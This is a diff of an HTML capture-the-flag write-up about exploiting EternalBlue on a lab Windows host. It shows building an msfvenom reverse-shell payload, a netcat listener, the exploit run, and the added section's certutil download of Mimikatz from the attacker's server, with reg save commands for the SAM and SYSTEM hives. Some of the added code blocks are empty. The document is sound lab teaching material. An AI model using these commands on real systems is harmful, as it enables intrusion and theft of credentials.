@@ -73,7 +73,7 @@
                 <pre><code>case@local:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin</code></pre>
                 <p>Finally, we need to combine the kernel shellcode exploit binary with the reverse shell binary, again this would have been done by the "shell_prep.sh", but manually is easy too.</p>
                 <pre><code>case@local:~$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin</code></pre>
-                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years Web Development experience I find it diffcult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places into memory. The shellcode/payload will then execute providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
+                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years Web Development experience I find it diffcult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places it into memory. The shellcode/payload will then execute, providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
                 <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
                 <p>We can then run the exploit.</p>
                 <pre><code>case@local:~$ python3 eternalblue_exploit7.py 10.10.34.160 sc_x64.bin</code></pre>
@@ -87,14 +87,39 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32></code></pre>
                 
-            <section id="Four">
-                <h2>Step Four - Privilege Escalation</h2>
-                <p>Okay, so we have a stable/interactive reverse shell. We still only have "www-data" privileges. Let see what this user can do with "sudo". Using the command "sudo -l" we get the following output:</p>
-                <pre><code>User www-data may run the following commands on ip-10-10-236-162:
-    (ALL) NOPASSWD: ALL
-                </code></pre>
-                <p>This is now effectively game over. This is telling us that our current logged in user can execute commands as any user, that no password is required to do so, and that we can run any command. We can simply escalate to root now by executing "sudo /bin/bash". We are now root!</p>
-                <pre><code>root@ip-10-10-236-162:/var/www/html#</code></pre>
+            <section id="Three">
+                <h2>Step Three - Escalation and Password Dumping</h2>
+                <p>Firstly, let us see which user context our reverse shell is running under.</p>
+                <pre><code>C:\Windows\system32>cmd.exe /c whoami
+cmd.exe /c whoami
+nt authority\system</code></pre>
+                <p>We have gained <i>NT AUTHORITY\SYSTEM</i> privileges. This is the highest level of privilege on Windows, similar to "root" on Linux. Therefore, we now have full administrative control on the target machine and should be able to perform any action on the system, including altering files, changing settings and installing programs. Given this information we can now upload Mimikatz, which will allow us to extract additional sensitive information, such as password hashes and kerberos tickets (Mimikatz is a post-exploitation tool designed to allow attackers to extract sensitive data, like passwords). Let us upload Mimikatz to our target, with a view to dumping the NTLM hashes (part of this CTF is cracking a specific password, so we will need this information). </p>
+                <p>You can download Mimikatz binaries from the GitHub <a href="https://github.com/gentilkiwi/mimikatz/releases"> releases repo.</a> Next, start a Python HTTP server. I have a virtual environment setup, so the command looks like this.</p>
+                <pre><code>(kcah_py_env) case@local:~$ python3 -m http.server 8001</code></pre>
+                <p>Then request the "mimikatz.exe" from the target server (make sure the mimikatz executable is located in the same directory as you are running the Python server from).</p>
+                <pre><code>C:\Windows\system32>certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
+certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
+****  Online  ****
+  000000  ...
+  108c00
+CertUtil: -URLCache command completed successfully.</code></pre>
+                <p>We have successfully upload the mimikatz executable to our target server. We now want to extract the password hashes. We need to accesss the Security Account Manager (SAM) hive, which is the file that contains the hashed passwords of all the local user accounts. However, we have a problem, as the file will likely already be in use by another system process, and will be locked by Windows. Attempting to read them directly with Mimikatz will likely fail. The first step, therefore, will be to export the relevant hives/files from the Windows Registry into separate files that we can readily access with Mimikatz. </p>
+            <pre><code>C:\Windows\System32>reg save hklm\sam c:\sam</code></pre>
+            <pre><code>C:\Windows\System32>reg save hklm\system c:\system</code></pre>
+            <p>Here is our output. It appears we have a problem!</p>
+            <pre><code>C:\Windows\system32>reg save hklm\sam c:\sam
+reg save hklm\sam c:\sam
+ERROR: A required privilege is not held by the client.</code></pre>
+            <p>Fortunately for us we have uploaded the excellent post exploitation tool Mimikatz. Mimikatz has the following command <i>privilege::debug</i>. When you run this command Mimikatz attempts to grant the process <i>SeDebugPrivilege</i>, which is a Windows privilege that allows a user to debug processes owned by other users. Importantly, it includes the ability to read and write to the memory of other processes, including retrieving sensitive information such as passwords and hashes, from processes like "lsass.exe" (the Local Security Authority Subsystem), which manages user logins and authentication. </p>
+            <p>Start Mimikatz.</p>
+            <pre><code></code></pre>
+
+
+                
+            <p>Here we export the SYSTEM hive too, which typically contains configuration settings and parameters that Windows uses during the boot process and for the management of hardware devices.</p>
+            <p>Once we have extracted the hives we can use Mimikatz to dump the password hashes.</p>
+            <pre><code></code></pre>
+                
             </section>
             
             <section id="solution">
